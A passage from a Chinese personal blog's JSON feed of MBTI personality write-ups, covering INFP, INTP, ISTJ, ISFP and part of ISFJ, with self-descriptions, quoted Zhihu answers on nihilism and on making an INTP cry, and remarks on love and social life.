很会享受生活和发现生活中不经意的美。是适合当富二代的性格吧，在世俗意义上其实算个废物，但是很适合发展高雅的兴趣爱好和到处吃喝玩乐。不适合当打工人，当打工人的话心态会比别人更容易崩，因为抗压性比较差。</p>\n<p>43. 在非原则性问题上比较没有主见。随便，都可以，听你的都是常见口头禅。</p>\n<p>44. 更一点胡言乱语的聊天</p>\n<p>44. 贼容易在职场中说【很没脑子】的话，跟人亲近了一些就很容易交付自己的真心。然后时候复盘的时候懊悔：我是不是太跳脱了？那句话好像不应该那么讲，我们的关系好像没有好到那种程度…… 然后下次就继续开启沉默模式，尽量控制自己不跳转到欢脱模式。</p>\n<p>45. 又来跟大家分享我灵感涌现发明的生活小妙招了。</p>\n<p>46. 非常念旧，经常会回忆过去的事情，说出 “我真的好想回到小时候。” 这种话。目光经常是回头看，而不是朝着时间前进的方向看。每过一天都觉得前一天好像更有意思。</p>\n<p>47. 是个感性的人 er，喜怒哀乐一般都是真情流露，有时候真的觉得情绪是累赘，情绪一上来就跟男人 jing 虫上 一样，非常干扰当下理性的判断，也给别人留下不靠谱的印象。</p>\n<p>48. 其实有非常非常多的负面情绪，但是年龄越大，越不会倾诉出来。一方面觉得会给别人造成困扰，一方面觉得这个地球上的绝大部分人类是丑恶的，不可信任的。于是基本都是默默咽下，等到夜深人静失眠的时候再反复咀嚼消化苦涩的滋味。</p>\n<p>49. 看小红书经常随手点赞，怕自动刷新这个内容会变不见，但是之后并不会去看，兴趣太广泛 + 三分钟热度，过会就遇到更感兴趣的内容了 or 已经对刚刚那个内容不感兴趣了。知乎或者其他社交软件也差不多是这样。</p>\n<p>50. 每天醒来的时候都会问：什么时候才能退休？经常在心里想：毁灭吧我累了。</p>\n<p>51. 大部分是虚无主义者【这个我前面好像讲过了？】觉得一切皆空，啥都是虚假的，啥都不是真正存在的，啥都没意义。神游的时候经常在想活着的意义这类的问题。</p>\n<p>52. 看起来比较虚弱，说话声音比较小，声音起伏不会很大。呼吸也比较轻，容易感到太阳穴发涨眼压高，觉得自身的精力匮乏，不足以应付日常的工作和活动。</p>\n<p>52. 开智比较晚，s 系人可能在很小的时候就精通人情世故，拉帮结派那些了。但是在 s 系母亲苦口婆心的教导下，依然活得像个弱智儿，经常会做很孩子气的举动，和说孩子气的话。比如 “我讨厌你！我不跟你好了！”“神经病啊你！反弹！”。蹦跳着下楼梯，阳光下踩别人的影子，雨天转伞，扮鬼脸，生气噘嘴把头扭一边去，如果别人过来哄就转过去继续背对着，左右反复转动。听到不想听的话会把耳朵用手堵上，吃到很喜欢的美食会即兴哼歌，假装抠鼻屎抹到别人身上然后自己鹅鹅笑得像个傻逼… 诸如此类太多了，没脸继续列举了。</p>\n<p>53. 狠狠同情未来对象了，因为他得首先得未婚先爹，然后不罗里吧嗦，得有幽默感，得能忍受时好时坏的情绪，得能秒 get 到点并且一起做出反应，得做事井井有条有计划，得行动力强拉着我一起进步。其实我并配不上这样的 ta，所以这些也是神游时候的想象素材。</p>\n<p>54. 人群中的变色龙，能完美融入每一个气氛，做一个默默无闻存在感极低但是很和谐的背景布。（看气氛做表情，延迟度为 0 的捧场笑）</p>\n<p>55. 若是在不适应的、人比较多的娱乐场合，会不停喝水，缓解自己的窘迫和格格不入，一直在喝水和往返厕所的那个人一定是 ta。</p>\n<p>56. 虽然为人随和，但是边界感极强，不喜欢别人不取自用自己的东西（打过招呼了一般都会同意），欢迎转载，但是须注明出处，不问自取是为窃。</p>\n<p>有些倒胃口，我不喜欢 infp 的人格特质变成营销号的涨粉变现噱头。我们是活生生的人，我们的笑与泪如此宝贵可爱，不应该成为当代浮躁社会里谋利的卖点，至少在我这里不允许。</p>\n<h3 id=\"infp的爱情观\"><a class=\"markdownIt-Anchor\" href=\"#infp的爱情观\">#</a> INFP 的爱情观</h3>\n<p>INFP 是乐观的悲观者，也是悲观的乐观者。</p>\n<p>当 INFP 谈及爱情的时候，绝对不单单在谈论爱情。准确的说，除了亲情这种血缘维系的不可抗力，INFP 对友情和爱情还有所谓无法命名的第四种感情，都是模糊不清无限靠近的。因为 INFP 究其一生只追求一种感情，根本不论形式。</p>\n<p>我要的是可以与我灵魂共鸣的存在，不设限年龄性别物质，我会毫不在意别的一切。这世界上只有你懂我，只有我懂你，我们绝对站在一边，我愿意跟你来一场疯狂毫无禁忌的精神私奔。我甚至不在意我们之间有没有性可言，友情和爱情都只是关系的枷锁。找到你，我的灵魂终于有了 “朋友”，我会欣喜的发颤，死而无憾。</p>\n<p>可是人和人怎么可能做到完全相知，我深知这个不切实际的想法，所以我是个坚定的单身主义者。但是，我仍然不死心，尽头会有个人准备好了接纳我灵魂的一切不堪。很渺茫，但那不阻碍我期待。这个世界都能有 “我” 了，怎么就不可能有 “你” 呢？</p>\n<p>疯狂，纯粹，荒唐，执着，迷幻，理想主义，但我愿意付一生追寻。</p>\n<p>我不痛苦，我享受我的疯狂。</p>\n",
            "tags": [
                "INFP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/INTP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/INTP%E8%A7%A3%E8%AF%BB/",
            "title": "INTP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>最明显的气质就是纯真，就像一个顽皮的小孩子，什么都要试一试。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>我不幸福，是因为我不够聪明，我看的不够透。</p>\n<p>希望别人可以理解自己的奇特言行与思想。</p>\n<p>喜欢钻研一个问题钻研的很深，得到解答后就心满意足，懒得想要怎么通俗易懂的表达给他人听。</p>\n<p>强烈好奇心，重度拖延症，完美主义者。认为内在远比外在重要。</p>\n<p>生活技能仅能自给自足，多数时候是被照顾的那个。</p>\n<p>运用思维逻辑进行思考、探索各种原理和可能性才是他们最喜欢的状态，完成任务是次要的。</p>\n<p>会本能的寻找 ni，即 infj/intj 这两类恋人</p>\n<p>神 / 魔，神魔只在一念之间，上帝本尊，最能模拟 “道” 的思维方式，规则的化身</p>\n<p>我从来不会担心你会离开我，因为只有我的灵魂才能和你产生共鸣，独一无二，任谁也拿不走</p>\n<p>更类似于人工智能的思考方式，运用运算能力强解所有可能性，在进行深度学习，分析所有可能性，选取其中的最优解</p>\n<p>没法讲清楚自己脑内的思维过程，或者说别人没有能力听清楚他们的讲解的</p>\n<p>第五型人格似乎是透过放大镜观察这个世界，人与物都巨细无遗的呈现在他们眼前</p>\n<p>“人生无意义”，不过都是镜花水月大梦一场。不过你可以赋予你的人生自己的解读，寻找自己的意义。</p>\n<h3 id=\"如何搞哭intp\"><a class=\"markdownIt-Anchor\" href=\"#如何搞哭intp\">#</a> 如何搞哭 INTP</h3>\n<p>文章来源: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ1MjMzNDU5NS9hbnN3ZXIvMTgyODU5NzI1Nw==\">https://www.zhihu.com/question/452334595/answer/1828597257</span></p>\n<ul>\n<li>方案一：</li>\n</ul>\n<p>第一步：你得是一个理想主义者，有宏大的理想、极高的天赋、过人的才华。</p>\n<p>第二步：你为了理想纯粹又努力积极地活着。</p>\n<p>第三步：你在某个领域达到一个高度的时候，对世界失望了。陷入虚无，不复生存意志。</p>\n<p>然后 INTP 就哭了。一切美强惨，都能让 INTP 哭泣。参照 Rick and Morty 里的 Rick，电影《马丁伊登》里的主角。</p>\n<ul>\n<li>方案二：</li>\n</ul>\n<p>第一步：带 INTP 去大自然看看。</p>\n<p>第二步：最好是去非洲大草原。</p>\n<p>第三步：在保证安全的情况下，看看狮群，看看猎豹，看看鬣狗，羚羊等。</p>\n<p>然后 INTP 就哭了。大自然实在太美好了，动物实在是太富有生命力了，食物链真是残酷又美丽。同理，去看海，看蓝鲸虎鲸海豚等海洋生物也行。</p>\n<ul>\n<li>方案三：</li>\n</ul>\n<p>第一步：养一条忠诚听话的狗。</p>\n<p>第二步：养个两三年。</p>\n<p>第三步：当着 INTP 的面杀掉那条狗，并吃掉。</p>\n<p>然后 INTP 就哭了。还有什么会比赤裸地袒露出人性的丑恶，与动物的单纯形成强烈对比，更让人感到冲击性难过的事呢？但此做法大概率会戳爆 INTP 的愤怒点，INTP 是哭惨了，你人应该也没了，身死或永久性社死，总得死一个。</p>\n<ul>\n<li>方案四：</li>\n</ul>\n<p>第一步：你是一个底层人物。</p>\n<p>第二步：你是一个干净善良，与众不同的底层人物。尽管你遭受一系列不公与苦难病痛折磨，但仍努力活着。</p>\n<p>第三步：你有至死也热爱的事物，尽管你从未得到过。</p>\n<p>然后 INTP 就哭了。一个生活环境险恶，却美好干净，一直与命运抗衡，从未丢失掉本性的人，INTP 愿意称之为美丽的灵魂，美到能拯救心灵。</p>\n<ul>\n<li>方案五：</li>\n</ul>\n<p>第一步：成为少数能完全理解并认同 INTP 的人。</p>\n<p>第二步：成为他们的 Soulmate，给予关怀和爱。</p>\n<p>第三步：让他们不小心伤害到你，最终还因为不可抗力，你黯然离去了。</p>\n<p>然后 INTP 就哭了。INTP 最不愿意干的事就是伤害别人，何况是 Soulmate。哪怕是个 Fe 残废级 INTP，对此也会愧疚值，痛苦值 Max。最后大概会选择孤独终老。</p>\n<p>最后简单说一个万能大招：在让 INTP 看到无与伦比的美丽的同时，又让他们看到难以言说的痛苦。</p>\n<p>都给我哭。</p>\n<ul>\n<li>无奈补充</li>\n</ul>\n<p>“这些事不止 INTP 会哭吧？这不是谁都会哭吗？是人都会哭吧？我不是 INTP 也会哭啊？”</p>\n<p>来，咱们讲点逻辑。INTP 会哭的事≠只有 INTP 会哭的事，这是两个概念，望周知。</p>\n<p>INTP 也是人。这世上没有只有 INTP 会哭，但其他人都不会哭的事。 其他人格哭不哭，和 INTP 哭不哭没有任何冲突。</p>\n<p>就像有的人会因为紧张和尴尬哭泣，有的人会因为分手而哭泣，但很多 INTP 对这类事无感一样。我只是挑出了比较容易触动到 INTP 的那部分。不是说只有 INTP 会因为这些哭，大家想多了。</p>\n<p>还有那些说 “INTP 看完没哭，INTP 觉得无聊，INTP 感动也不至于哭。”</p>\n<p>OK，Fine。你不哭≠别的 INTP 不会哭。你哭不哭，跟这些事是否比较容易触动到 INTP，也没有任何冲突。</p>\n<p>多跳出自身思考问题。而且搞 MBTI 娱乐就好，别太代入，在这个越来越大众娱乐化的圈子里谁都不算与众不同。</p>\n<h3 id=\"对抗虚无主义\"><a class=\"markdownIt-Anchor\" href=\"#对抗虚无主义\">#</a> 对抗虚无主义</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ1MTQxMzkxNy9hbnN3ZXIvMjMyNzc2NjM4MA==\">https://www.zhihu.com/question/451413917/answer/2327766380</span></p>\n<p>应该花大量时间去学习、试错如何不在今天内卷的社会中成为废物。（intp 本就是最容易成为废物的人格）</p>\n<p>建议要是目前有更重要的事情的 intp，比如学习考试之类的，一定别去碰这类 “向内” 的书籍，无论是黑塞还是荣格还是尼采克里希那穆提…</p>\n<p>自以为自己玩这些东西是在探究世界的本质、意义，以为自己最牛，脑子里面装的全都是自以为很有深度的东西、自以为自己能透过现象看到本质、洞悉他人的情感…</p>\n<p>自以为别人都是废物，于是乎高傲自大。这些完全是低阶 intp 的特点吧！高阶的 intp 懂得真正的谦虚，能够发现自己的长处和短处，甚至能慢慢改变自己的短处，当然你现在所认为的自己的长处并不会因此消失，最好慢慢去收起你认为某些东西没用的心态吧，否则早晚一天栽在上面甚至于反复如此！最好的例子就是 intp 沉浸在虚无的心态中，实际上背后的本质问题是自己不去社交、严重缺少与真实世界的交流。</p>\n<p>（宗教、神秘学、灵修、哲学… 都尽量别碰，就算沉迷进去了一定要拿现实生活把自己救出去，否则 99% 荒废时间成为废物不止还要堕入虚无，一天到晚怀疑自己存在的价值、意义）</p>\n<p>看到有些评论貌似不怎么在意能不能从现实世界中获取大量财富，那么下面谈谈情绪上的:<br>\n 罗素曾说过，他发现自己痛苦难受的根本原因就是将其注意力一直放在自己的情绪上，而忽略了外界。</p>\n<p>当一个人的注意力是内在＞＞外在世界时，痛苦就如期而至，并且对于 intp 来说，这种痛苦甚至在初期让你觉得是自己的独到见解、自己比别人思想境界更深，然后慢慢陷进去难以出来。</p>\n<p>上述不要碰的东西就往往会使 intp 陷入这种状态中，因为 intp 往往社交不太行，没什么朋友，大部分其他人格的人，即便是陷入这种心态中了，总会因为不得不参与社交而逐渐转移注意力慢慢出来，而 intp 特别是低阶的 intp 是完全拒绝社交的、拒绝一切多人局！这就是他们长期沉浸在情绪痛苦中的原因，就是没有外在力量强行拉出来！而高阶的 intp 能够学会去建造这种力量。</p>\n<p>沉浸于向内的东西也一定会让 intp 啥事都干不成的，浪费时间。这些东西的特点就是太向内了，会让本来就不注重现实生活的 intp 更荒废现实，并且认为就应该这样，若不这样就是逃避掩盖一切事物本来就虚无的面目…</p>\n<p>参照黑塞《德米安》，虽说本无是非对错可言，但会让大部分 intp 成为社会定义中的废物。还是应该多接触接触现实世界，intp 很需要他人对自己想法的支持鼓励，那样才可以慢慢在表象看来融入社会中，当个特立独行的另类确实没什么不好的，但是你要面对各种各样的挑战、排挤、嘲讽，并且还要在内心深处把那些人都鄙视个遍，精神内耗是很浪费时间降低效率的！</p>\n<p>多和他人交流想法（这点对呀 intp 来说应该是最难的了，个人觉得更多应该在于如何学会大部分的社交讲话模式并内化吸收，以此学会如何用话语去暗示对方为自己办事，intp 若能学会如何在现实中掌控别人，那么将会完全释放出自己那么多年了所积攒的能量、魅力变得不同于大众很厉害）</p>\n<p>即便内心完全认为别人就是废物也逼着自己学着去交流，是不是发自内心的完全没有关系，只是为了学习罢了，否则真的太容易变成一事无成的废物了，各个领域都懂得很多很深入但是没卵用，生活一样烂得像滩屎，一辈子都生活在认为周围全都是废物的环境，没有条件进入更高的阶层认识能被自己幕强，能和自己思想碰撞的人…</p>\n<p>一定要学会在现实生活中寻求快乐！<br>\n总之要学会找到现实中自己的兴趣，并以此为业。偶尔切换到原本的状态，在现实中找到乐趣，哪怕是沉浸在性爱、钱财…</p>\n<p>都比沉迷一堆文字概念对 intp 有益，以 intp 的强大的洞察力、对普遍事物的一般规律的抽离能力，只要你能够沉入现实的乐趣中，比如搞钱，那么也会慢慢变得富有起来，反例就是很年轻的时候就已经沉迷在一堆文字概念中、看似对生活无欲无求、天天思考一些实际中没什么用的问题，最后在社会中变成自己小时候最瞧不起的平庸之辈！</p>\n<p>最后给所有 intp 们一句忠告:</p>\n<p>生命本就是无意义的，别再死磕这种类似的问题了，别再看一大堆无聊死了的玩概念的所谓的高深的书籍了，生命真正的意义在于每个当下你所感受到的生机（自己去感受吧，怎么描述都是一回事）而不是 “生命的意义是什么” 这种本就不应该成为问题的问题当中，现在我才慢慢得以明白。</p>\n<p>如克里希那穆提所言，只有真正无聊且无趣并且无所事事的人才能想出这种无聊至极的问题并以此许以深奥的字眼描述它，进而束缚自己对生命、世界、现实的真正的感知！</p>\n<h3 id=\"intp的弱点\"><a class=\"markdownIt-Anchor\" href=\"#intp的弱点\">#</a> INTP 的弱点</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ1MTQxMzkxNy9hbnN3ZXIvMjMyNzc2NjM4MA==\">https://www.zhihu.com/question/451413917/answer/2327766380</span></p>\n<p>INTP 可能是太孤独了，特别渴望得到共鸣。于是碰到一个稍微聊得来的人时，往往就容易产生一种觅得知音的珍惜感。实际上，人活这辈子遇到的那么多人里，能有几个真的理解你的？期待人人都可以心无间隙的交流沟通，是一个多么奢侈而贪心的心愿。</p>\n<p>当别人无意间戳中你内心柔软点时，你就会特别兴致昂扬的跟别人攀谈起来。但往往对方就会突然显得很冷淡，因为对方的社交面具经不起你这种拷打，破裂了。你就会猛然感到理想与现实之间的裂痕，而感到一阵伤心。你会加深孑然一人的孤独感。而这几乎是生活里不可避免的。</p>\n<p>如同对缺爱的人来说，一点爱就能让他感动和回报，而我们显然是缺理解的，一点理解就能让我们引以为亲信，这正是我们赤裸裸的弱点所在。</p>\n<p>不知道多少 INTP 跟我一样属于 “颜狗”，此处的 “颜狗” 不单指对长得好看的人会降下防备心（毕竟所谓的美男美女因人而异），主要特指那些你觉得看起来很面善、感受相貌令你比较舒服的人（不一定是恋爱，也可能是朋友、同事这种），不知道是比较相信面相学还是对自己的判断过于自信，遇到这种人，我往往会心生一种不由自主的亲近感。正如我会对面相不太喜爱的人自然而然的敬而远之一样。然而！雷点来了！</p>\n<p>人不可貌相这句话，亲测具有盲点。有些人看起来仪表堂堂，一身正气，实际上内心也可能很小家子气。对他人内心的认识，千万不要过分相信其出身、谈吐、以及自己对面相学的判断，尤其是刚刚开始认识的时候，千万记得交浅勿言深。</p>\n<p>不知道是不是因为我天性比较不自信，起初总是很难分辨一些人是不是只是徒有其表。很多外表气质谈吐不俗的人，往往在了解、逐渐看穿对方内心空无一物时，令我感到窒息般的失望。</p>\n<p>随着阅历的增加，我发现很多牛逼哄哄冠冕堂皇的大佬，大多只是被包装出来的，接地气没架子的，有时候才是真的大佬。千万不要因为一个人形象好（而非习气好），就对这个人高看一眼，很容易打脸。</p>\n<p>在这个物欲横流、肤浅成风的时代，社会上的绣花枕头多到泛滥，尤其是各种媒体、活动前展示的，好多都表演型人格。他们背后是什么样，内心怎么想，你根本想象不到。</p>\n<p>你要意识到，人的精力有限，有所投入必然有所失去，有些人之所以花那么多时间做表面功夫，某种程度上也是利用人性看脸的弱点，让人甫一接触，便以为他很厉害，根本顾及不到他有没有内涵。虽然你看不上做表面文章，但这个方法无论何时，确实有效！</p>\n<p>因为哪怕你再理性，你的生理机制也会让你对形象好的人更高看一眼。尽管我们很抗拒取巧于人，但有些时候只有适度克服自己的心理弱点，才能更大层面实现共赢。</p>\n",
            "tags": [
                "INTP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ISTJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ISTJ%E8%A7%A3%E8%AF%BB/",
            "title": "ISTJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>他们严谨、客观、讲求逻辑实效、按章办事、不很爱说话。同时又是有自主意见、坚韧不拔，不易被人影响的类型。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>一丝不苟，极度严谨、极度自律同时也是极度可靠。他们非常适合从事那些类似检查、核对之类的工作。</p>\n<p>安静、严肃、勤奋且有责任心，他们具有很强的集中力、条理性和准确性，对于细节有很强的记忆和判断。</p>\n<p>总是很传统、保守，他们聆听和喜欢确实、清晰地陈述事物；他们重视必要的理论体系和传统惯例，对于那些不是如此做事的人则很不耐烦。</p>\n<p>背后的驱动力是责任、生产力和效果（不是效率）。</p>\n<p>日常生活中最重要的是结构、流程和秩序。ISTJ 们都指定了结构化的流程，而且高效地执行，并期待别人也这样做。ISTJ 的工作就是生活，生活就是工作。</p>\n<p>喜欢一种幕后的、比较安静的方式来维护整个组织的正常秩序，更喜欢与物打交道而不是人，同时他们也是最喜欢去整理东西的一种类型。</p>\n<p>特别喜欢做他们以前做过的事情，喜欢从事一些高重复性的工作。在重复中他们会感觉踏实、安全、有把握，而且一点都不会觉得枯燥。</p>\n<p>一群非常朴素甚至可以说是非常俭朴的人，他们在买东西的时候主要考虑的是性价比和耐久性，是最不会去赶时髦、追逐新潮的人，常常是 “喜旧厌新”。</p>\n<p>说 ISTJ 喜旧厌新，不是他们反感新（虽然他们经常是创新的阻力）只要 “新” 一旦看见实际效果，他们就会迅速落实实施，积极推进。</p>\n<p>ISTJ 的行为中明显包含了 “给我看”、“给我证明” 的情况 ——“给我看为什么这样可以节约成本”、“证明给我看你是对的”。</p>\n<p>劣势就是 ISTJ 的反向人格特征，可以说 ENFP 偏好舒服的，几乎都是 ISTJ 不爽的。ISTJ 们不喜欢创意和创新，也不关注人的情感和成长，这成了 ISTJ 们的死穴。</p>\n",
            "tags": [
                "ISTJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ISFP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ISFP%E8%A7%A3%E8%AF%BB/",
            "title": "ISFP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>平时好说话，佛系，生气的时候会沉默离开。不喜欢冲突，为了和平的氛围会忍让，除非涉及到底线。</p>\n<h2 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h2>\n<p>做选择时，小事很随便，大事很执拗。非常讨厌别人逼我做事情。计划范围一般在一周内，更在意的就是今天要干什么。</p>\n<p>别人对我 / 说的话第一直觉是相信，觉得别人没有必要骗自己。相信人性本善，待人真诚，不精明。经常自省自责，把自己贬低的一无是处。</p>\n<p>艺术审美有自己的见解，不随波追流。擅于发现生活的美，不像麻烦别人，不想亏欠别人。</p>\n<p>对带有消极情绪的事情不看不想不面对。置身在美丽的大自然，总会让我感动。</p>\n<p>没有上进心，随遇而安，出门看心情不看天气。假期可以一直烂在床上。抽象的作品，能感受到其中的情绪但要清晰具体的表达出来会比较困难。</p>\n<p>吃着喜欢的食物，搭配着想看的视频就会很幸福。对于大量文字的文章缺乏耐心。</p>\n<p>注意隐私，不好奇别人的隐私，也不希望别人好奇我的。理财白痴，快乐就是意义，没有歌曲无法干活。</p>\n<p>自认为最美好的词：和平，爱，自由。一直在看书的路上，一直没有看完书。擅于发现别人的优点。对流程复杂的事物感到痛苦。</p>\n<p>经常会做傻事，为自己的愚蠢感到生气。网上冲浪大部分时间是在看小动物。平时话不多，开心活着焦虑时表达欲则会变得十分旺盛。</p>\n<p>责任感不强，没有领导能力。大概就是：别来管我，我也懒得管你。</p>\n<p>讨厌装逼、强势、爱说教、咄咄逼人的人。讨厌形式主义，感觉没有意义，浪费生命。玻璃心，会躲起来偷偷哭泣，但情绪来得快去的也快。</p>\n<h2 id=\"人格分析\"><a class=\"markdownIt-Anchor\" href=\"#人格分析\">#</a> 人格分析</h2>\n<p>和多数 IP 类型一样，无意控制他人，淡然随和；同时又跟多数 SP 一样灵活多变，而 SF 又说明他们感情细腻，对人敏感，相对于其他类型来说，在与他人的相处时，不愿影响也不愿评价或改变别人</p>\n<p>对处理美、欣赏美乃至创造美这些事情具有极高的天赋，可能一大部分来自于他们敏锐的五官感觉，他们对于颜色，气味，光线，声音都十分的敏感，能够察觉出别人根本察觉不到的细微差别。</p>\n<p>喜欢艺术且都有一定的艺术特长，对音乐，绘画以及各种涉及感官的艺术形式的感觉往往高人一等。</p>\n<p>精致而静美，非常聪明、机智而且很实际，加上所有 FP 的人心理年龄都偏小，所以 ISFP 在表面上的矜持之下实际上隐藏了一种灵动和调皮。</p>\n<p>同其他 SP 一样，他们其实也非常清楚自己要什么以及如何用最简单的方式得到自己想要的。</p>\n<p>对感官刺激非常敏感在意，会特别追求舒适的生活，用慵懒这个词来描述很合适，注意不是懒惰。</p>\n<p>做事情要求舒服，和谐，充满美感，而最美而和谐的事情莫过于悠闲而优雅的生活。</p>\n<p>会比较追求物质上的享受，可能是 16 人格中对物质生活的要求最高的。无论是美食、美景、美丽的衣服或者是美人，这些都会让他们趋之若鹜。</p>\n<p>做事情基本凭感觉，由于是 IFP 的人，很难将自己的决定用逻辑上可靠的语言表达出来，也就是讲清楚自己为什么这么做，而只是做感觉好的事情。</p>\n<p>共情能力强，感知情绪很敏锐。大多数时间还是喜欢一个人待着。没有时间观念，拖延症晚期。作品没有达到预期会非常沮丧。</p>\n<p>不希望因为时间变少而降低作品质量要求。讨厌不纯粹的交际。会放大他人对自己的否定。不愿意伤害别人，说话会照顾他人情绪。</p>\n<p>不喜欢被众人关注，偶尔会喜欢被自己人关注。喜欢看美好的正能量的有逻辑的影视作品，不愿意看悲观压抑的文艺片。</p>\n<p>合格的倾听者。不加节制，容易放纵自己的欲望。很多时候不在乎与自己无关的事情。与人聊天容易关注一些奇奇怪怪的点并提出反问从而带跑话题走向。</p>\n",
            "tags": [
                "ISFP"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ISFJ%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ISFJ%E8%A7%A3%E8%AF%BB/",
            "title": "ISFJ解读",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>他们严谨、保守、敏感、友善、乐于助人，“贼能忍”。特征可以理解为让大家远离各种不好的东西，也就是保护，所以我更喜欢叫他们保护者。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>喜欢并且也擅长从事一些保护其他人的工作，他们有一种使他人远离危险、免受伤害的本能。在照顾老人和儿童方面，ISFJ 也有得天独厚的优势。</p>\n<p>使命和愿望就是为他人服务。守规矩，贴心，注意细节，温柔且处处为人着想的员工。</p>\n<p>忠诚、有奉献精神和同情心，意志清醒而有责任心，乐于为人，理解别人感受。同时十分务实。喜欢自己安静地工作，谨慎、有着安静和丰富的内心世界。</p>\n<p>喜欢平和谦逊的人，喜欢利用大量的事实情况，对于细节则有很强的记忆力。他们耐心地对待任务的整个阶段，喜欢事情能够清晰明确。</p>\n<p>是 16 型人格当中最悲观的类型之一。四种 SJ 在看待未来的时候普遍悲观，但是相对而言 ISTJ 和 ISFJ 会更悲观一点。</p>\n<p>经常处于一种时刻保持警惕的状态，随时警觉着现实当中可能发生的各种危险。是最坚忍、最能吃苦的类型之一。大部分认为自己 “命苦”，安全感很低，可能过于悲观而显得愁苦。</p>\n<p>愿意在一种有规则、有秩序的方式下生活。通常是最为尽忠职守、最负责任的人之一。偏好扮演幕后功臣的角色，是一些默默地为大家付出和奉献的人，甘居于幕后，不喜欢经常抛头露脸。</p>\n<p>对自己和别人关于规则、章程、流程等行为以及一系列应该做的和必须做的事情都有很高的期望，违反或不尊重这些对 ISFJ 来说是大忌。</p>\n<p>只要 ISFJ 愿意做的事他们的忍耐力是极强的，哪怕要加班、材料不到位、时间紧迫、如果组织需要他们可以临时充当任何一个角色。</p>\n<p>缺点：他们可能因为过于悲观而显得愁苦，容易觉得自己是个 “苦命人”。经常处于一种担忧和警惕的状态中，有一种 “自舔伤口” 的性格，这很伤身体。</p>\n<p>缺点：过于小心谨慎，会降低行动力，变得不够开拓进取；想的太多，且相信言多必失和沉默是金的原则，在有些人眼里会显得不够坦诚。对人际交往的深度造成了障碍。</p>\n<p>缺点：都可能会为自己所爱、所关心的人想得太多，他们对危险的过度防范很有可能在对方眼里显得有些 “婆婆妈妈”。</p>\n<h3 id=\"mq性格分析\"><a class=\"markdownIt-Anchor\" href=\"#mq性格分析\">#</a> MQ 性格分析</h3>\n<p>不能直接抽象，需要从实际出发。从实际生活中的具体案例入手，例如家庭、职场或者个人方面的问题，或者一些常见的情感问题等。在这样的基础上，你可以分享一些有关心理学的知识或者观点，帮助 ISFJ 更好地理解和应对这些问题。</p>\n<ul>\n<li>\n<p>喜欢研究星座<br>\n喜欢了解自己和他人的性格特点，以此为基础去建立良好的人际关系。</p>\n</li>\n<li>\n<p>喜欢明星林俊杰<br>\n喜欢听歌、看综艺等娱乐活动。</p>\n</li>\n<li>\n<p>不太会拒绝别人<br>\n善良和包容心，擅长照顾和关心别人，是个值得信赖的朋友。通常很友善，不太擅长拒绝别人，因此可能会在他人提出请求时，难以拒绝。</p>\n</li>\n<li>\n<p>内心比较自卑敏感 —  <code>好看的不是一个发型或者一件衣服，而是人。</code> <br>\n这个人可能会比较容易受到他人的评价和批评，可能会花费很多心思在自己的形象和表现上，希望能够得到别人的认可和赞许。内心焦虑。</p>\n</li>\n<li>\n<p>擅长倾听和体谅他人<br>\n关心他人的感受，懂得为别人着想。可能会过度关注别人的反应和评价，而忽略了自己的真实需求和感受，需要学会关注和表达自己的内心。</p>\n</li>\n<li>\n<p>比较信奉权威家长长辈<br>\n可能会对他们的意见和建议非常重视，并且会遵从他们的要求和规定。在社交场合中，这个人可能会显得比较安静和内向，不太善于表达自己的想法和情感。</p>\n</li>\n<li>\n<p>有很强的责任心<br>\n这个人可能会承担很多事情，希望尽自己的力量去帮助别人。但是有时候也会因此忽略了自己的需求和感受，需要注意自我保护。</p>\n</li>\n<li>\n<p>细心认真很上进<br>\n在工作和学习中表现出色，能够充分发挥自己的才能和能力，得到别人的认可和赞扬。同时，也需要注意在过度追求完美和细节时，不要让自己变得过于苛求和紧张。</p>\n</li>\n<li>\n<p>遵守规则和程序<br>\n倾向于信奉权威和长辈的话语，因此有时候可能会过于顺从或缺乏自主性。</p>\n</li>\n<li>\n<p>热衷于独处<br>\n很享受独处的时间，一个人也可以很快乐。</p>\n</li>\n<li>\n<p>喜欢稳定和安全<br>\n不喜欢冒险和变化，因此可能会比较保守和顾虑周全。更乐意去做一些已经做过的事情。吃同一家食堂的饭，做熟悉的工作。非常认真细心，他们希望能够从事自己熟悉和擅长的工作，并且能够获得成就感。如果工作内容和他们的期望不符，他们可能会考虑辞职。</p>\n</li>\n</ul>\n<h3 id=\"isfj的爱情\"><a class=\"markdownIt-Anchor\" href=\"#isfj的爱情\">#</a> ISFJ 的爱情</h3>\n<p>文章来源: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS96aGVuZ2h1aTAwMQ==\">https://www.zhihu.com/people/zhenghui001</span></p>\n<p>ISFJ 